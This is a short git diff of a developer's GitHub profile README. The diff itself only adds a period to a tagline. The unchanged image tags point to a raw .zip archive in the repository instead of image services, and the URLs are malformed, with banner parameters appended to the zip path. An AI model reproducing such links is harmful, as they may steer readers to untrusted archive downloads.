@@ -1,7 +1,7 @@
 <div align="center">
   <img width="100%" src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip,100:764ba2&height=200&section=header&text=Reuben%20Korsi%20Amuzu&fontSize=50&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Full%20Stack%20Developer%20|%20Software%20Engineer&descAlignY=55&descAlign=50" />
   
-   #### Building scalable web applications and turning ideas into reality 
+   #### Building scalable web applications and turning ideas into reality. 
   
   <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip%20views&color=0e75b6&style=flat" alt="profile views" />
 
